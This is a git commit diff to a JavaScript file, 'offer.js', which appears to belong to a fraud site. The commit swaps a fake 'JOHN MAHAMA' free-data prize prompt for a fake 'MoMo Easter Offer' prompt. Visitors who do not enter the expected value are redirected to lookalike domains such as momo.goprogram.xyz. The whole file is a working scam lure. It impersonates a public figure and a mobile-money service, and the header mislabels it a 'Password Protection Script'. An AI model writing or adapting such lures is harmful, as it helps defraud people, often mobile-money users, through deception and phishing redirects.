d126ed4c3e9cd591d6bf4cc6e90669768ceda163
realmankeny <realmankeny@gmail.com>
2025-04-18 22:58:16 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'R350'
+password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive R350 MoMo Easter Offer, Kindly Press OK to PROCEED  ','R350');
+if (password != 'R350') {
+location.href='https://momo.goprogram.xyz/gift';
 }
